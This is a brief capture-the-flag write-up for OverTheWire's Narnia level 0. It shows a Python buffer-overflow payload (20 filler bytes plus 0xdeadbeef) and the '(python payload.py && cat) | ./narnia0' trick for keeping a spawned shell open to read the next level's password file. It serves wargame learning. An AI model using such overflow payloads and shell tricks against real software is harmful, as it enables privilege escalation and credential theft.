Simple level, c reads in a char array that only takes in 20 characters.

It then checks that the previously defined 'val' value is set to 0xdeadbeef

By writing a simple lil python script:
_________________________________________________
payload = b'A'*20 + b'\xef\xbe\xad\xde'
print(payload)
_________________________________________________

You can pipe the output to narnia0

python payload.py | ./narnia0

That will execute /bin/sh with as narnia1, the owner, but unfortunately the stdin closes, so now what?


By appending && to the python half of the command with cat, it then attempts to find an input for cat by keeping stdin open


(python payload.py && cat) | ./narnia0

Doing so grants an escalated shell, allowing you to send 'cat /etc/narnia_pass/narnia1'
